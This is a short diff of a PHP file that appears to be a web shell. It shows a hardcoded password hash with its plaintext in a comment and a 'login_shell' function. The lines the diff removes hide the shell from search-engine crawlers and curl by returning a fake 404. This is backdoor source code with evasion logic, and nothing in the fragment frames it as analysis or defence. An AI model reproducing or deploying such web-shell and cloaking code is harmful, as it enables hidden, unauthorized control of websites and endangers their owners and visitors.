@@ -16,17 +16,6 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 
 $password = "329eadfcb8f4deee2155009da4545105"; # md5: m01t
 
-$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
-$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
-
-if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
-    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-        header('HTTP/1.0 404 Not Found');
-        exit;
-    }
-}
-
 function login_shell() {
 ?>
 <!DOCTYPE HTML>
